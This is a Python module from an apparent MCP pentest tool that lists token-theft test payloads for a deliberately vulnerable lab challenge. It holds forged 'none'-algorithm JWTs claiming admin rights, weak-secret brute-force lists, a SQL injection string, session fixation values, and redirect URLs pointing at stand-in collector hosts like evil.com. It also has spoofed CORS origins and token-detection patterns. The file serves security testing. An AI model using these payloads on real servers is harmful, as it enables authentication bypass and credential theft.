"""
Token Theft Payloads for MCPloit.

Contains payloads for testing token leakage, session hijacking,
and credential exposure vulnerabilities in MCP servers.

Target Challenges:
- DVMCP Challenge 7: Token Theft (insecure token storage)
"""

from .base import Payload, PayloadCategory, PayloadSeverity


def get_payloads() -> list[Payload]:
    """Return all token theft detection payloads."""
    return [
        # === TOKEN THEFT PAYLOADS ===
        # Challenge 7: WORKS - Direct authentication tool + hardcoded credentials
        # Tokens extracted via direct tool calls with known credentials, not payloads

        # === ERROR MESSAGE ANALYSIS ===
        Payload(
            name="trigger_error_token_leak",
            description="Trigger errors that may leak tokens in error messages",
            category=PayloadCategory.TOKEN_THEFT,
            payload="invalid_service_12345",
            variants=[
                "nonexistent_endpoint",
                "malformed_request",
                "__proto__",
                "undefined",
                "null",
                "",
                "' OR '1'='1",
            ],
            target_params=["service", "service_name", "endpoint", "target", "id"],
            success_indicators=[
                "token", "jwt", "bearer", "api_key", "secret",
                "authorization", "auth_token", "access_token"
            ],
            severity=PayloadSeverity.HIGH,
            technique="error_disclosure",
            context="Invalid inputs that may trigger verbose error messages containing tokens",
        ),

        Payload(
            name="force_auth_failure",
            description="Force authentication failures to expose token handling",
            category=PayloadCategory.TOKEN_THEFT,
            payload="invalid_token_abc123",
            variants=[
                "expired_token",
                "malformed.jwt.token",
                "Bearer invalid",
                "eyJhbGciOiJub25lIn0.eyJzdWIiOiJ0ZXN0In0.",  # None algorithm JWT
                "null",
            ],
            target_params=["token", "auth_token", "bearer", "authorization", "jwt"],
            success_indicators=[
                "expected", "valid token", "invalid token",
                "token format", "jwt", "authentication"
            ],
            severity=PayloadSeverity.MEDIUM,
            technique="auth_error_analysis",
            context="Analyze authentication error responses for token format leaks",
        ),

        # === LOG EXPOSURE ===
        Payload(
            name="log_file_token_search",
            description="Search patterns for tokens in log files",
            category=PayloadCategory.TOKEN_THEFT,
            payload="Bearer ",
            variants=[
                "Authorization:",
                "token=",
                "api_key=",
                "access_token=",
                "refresh_token=",
                "jwt=",
                "session_id=",
                "X-API-Key:",
            ],
            target_params=["query", "search", "pattern", "filter"],
            success_indicators=[
                "eyJ",  # JWT header
                "sk-", "pk-",  # API keys
                "token", "secret", "password"
            ],
            severity=PayloadSeverity.CRITICAL,
            technique="log_analysis",
            context="Patterns to detect tokens in log output",
        ),

        Payload(
            name="verbose_logging_trigger",
            description="Trigger verbose logging that may expose tokens",
            category=PayloadCategory.TOKEN_THEFT,
            payload="__debug__=true",
            variants=[
                "verbose=1",
                "log_level=DEBUG",
                "trace=true",
                "debug_mode=on",
                "X-Debug: true",
            ],
            target_params=["param", "header", "query", "option"],
            success_indicators=[
                "DEBUG", "TRACE", "token", "credential",
                "authorization", "secret"
            ],
            severity=PayloadSeverity.MEDIUM,
            technique="debug_mode_trigger",
            context="Enable debug logging that may leak sensitive data",
        ),

        # === JWT-SPECIFIC ATTACKS ===
        Payload(
            name="jwt_none_algorithm",
            description="JWT with 'none' algorithm to bypass signature verification",
            category=PayloadCategory.TOKEN_THEFT,
            payload="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImFkbWluIjp0cnVlfQ.",
            variants=[
                "eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.",
                "eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJhZG1pbiI6dHJ1ZX0.",
                "eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.",
            ],
            target_params=["token", "jwt", "authorization", "auth_token"],
            success_indicators=[
                "admin", "authorized", "success", "valid", "accepted"
            ],
            severity=PayloadSeverity.CRITICAL,
            technique="jwt_algorithm_confusion",
            context="Test for JWT 'none' algorithm vulnerability",
        ),

        Payload(
            name="jwt_secret_brute",
            description="Common weak JWT secrets for testing",
            category=PayloadCategory.TOKEN_THEFT,
            payload="secret",
            variants=[
                "password",
                "123456",
                "jwt_secret",
                "supersecret",
                "your-256-bit-secret",
                "changeme",
                "key",
                "private",
            ],
            target_params=["secret", "jwt_secret", "signing_key"],
            success_indicators=[
                "verified", "valid", "success", "decoded"
            ],
            severity=PayloadSeverity.HIGH,
            technique="jwt_weak_secret",
            context="Test for weak JWT signing secrets",
        ),

        # === SESSION TOKEN ATTACKS ===
        Payload(
            name="session_fixation_check",
            description="Check for session fixation vulnerabilities",
            category=PayloadCategory.TOKEN_THEFT,
            payload="SESSIONID=attacker_controlled_value",
            variants=[
                "session_id=fixed_session_123",
                "sid=predetermined_value",
                "token=attacker_token",
                "auth=fixed_auth_value",
            ],
            target_params=["cookie", "header", "session", "session_id"],
            success_indicators=[
                "session", "authenticated", "logged in", "accepted"
            ],
            severity=PayloadSeverity.HIGH,
            technique="session_fixation",
            context="Test if server accepts predetermined session tokens",
        ),

        Payload(
            name="token_prediction_pattern",
            description="Detect predictable token generation patterns",
            category=PayloadCategory.TOKEN_THEFT,
            payload="analyze_token_pattern",
            variants=[
                "sequential_check",
                "timestamp_based",
                "incremental_id",
                "low_entropy",
            ],
            target_params=["analysis_type", "check"],
            success_indicators=[
                "predictable", "sequential", "incremental",
                "timestamp", "weak", "guessable"
            ],
            severity=PayloadSeverity.HIGH,
            technique="token_prediction",
            context="Analyze token patterns for predictability",
        ),

        # === TOKEN EXPOSURE VECTORS ===
        Payload(
            name="referer_header_leak",
            description="Check if tokens leak via Referer header",
            category=PayloadCategory.TOKEN_THEFT,
            payload="https://evil.com/collect?token=",
            variants=[
                "http://attacker.com/log?",
                "https://malicious.site/capture?auth=",
                "http://external.com/?session=",
            ],
            target_params=["redirect_url", "callback", "return_url", "next"],
            success_indicators=[
                "token", "auth", "session", "jwt", "api_key"
            ],
            severity=PayloadSeverity.HIGH,
            technique="referer_leakage",
            context="Test for token exposure via redirect URLs",
        ),

        Payload(
            name="url_token_exposure",
            description="Check if sensitive tokens appear in URLs",
            category=PayloadCategory.TOKEN_THEFT,
            payload="?token=SENSITIVE&api_key=SECRET",
            variants=[
                "?access_token=VALUE",
                "?jwt=TOKEN",
                "?auth=CREDENTIAL",
                "#token=HASH_PARAM",
            ],
            target_params=["url", "endpoint", "path"],
            success_indicators=[
                "token=", "api_key=", "jwt=", "auth=", "secret="
            ],
            severity=PayloadSeverity.MEDIUM,
            technique="url_exposure",
            context="Detect tokens exposed in URL parameters",
        ),

        # === RESPONSE HEADER ANALYSIS ===
        Payload(
            name="response_header_tokens",
            description="Check response headers for leaked tokens",
            category=PayloadCategory.TOKEN_THEFT,
            payload="analyze_headers",
            variants=[
                "check_set_cookie",
                "check_authorization",
                "check_custom_headers",
            ],
            target_params=["analysis_mode"],
            success_indicators=[
                "X-Auth-Token", "X-API-Key", "Authorization",
                "Set-Cookie", "X-Session", "X-JWT"
            ],
            severity=PayloadSeverity.MEDIUM,
            technique="header_analysis",
            context="Analyze response headers for token exposure",
        ),

        Payload(
            name="cors_token_steal",
            description="Check for CORS misconfigurations enabling token theft",
            category=PayloadCategory.TOKEN_THEFT,
            payload="Origin: https://attacker.com",
            variants=[
                "Origin: null",
                "Origin: https://evil.attacker.com",
                "Origin: https://trusted.com.attacker.com",
                "Origin: https://trustedcom.attacker.com",
            ],
            target_params=["header", "origin"],
            success_indicators=[
                "Access-Control-Allow-Origin: *",
                "Access-Control-Allow-Origin: https://attacker",
                "Access-Control-Allow-Credentials: true"
            ],
            severity=PayloadSeverity.HIGH,
            technique="cors_misconfiguration",
            context="Test CORS policies that may allow token theft",
        ),

        # === CACHE-BASED ATTACKS ===
        Payload(
            name="cache_poisoning_token",
            description="Check for cached responses containing tokens",
            category=PayloadCategory.TOKEN_THEFT,
            payload="Cache-Control: no-store",
            variants=[
                "Pragma: no-cache",
                "X-Cache: HIT",
                "X-Cache-Status: BYPASS",
            ],
            target_params=["header", "cache_control"],
            success_indicators=[
                "MISS", "HIT", "STALE", "cached",
                "token in response", "credentials cached"
            ],
            severity=PayloadSeverity.MEDIUM,
            technique="cache_analysis",
            context="Detect token caching issues",
        ),
    ]
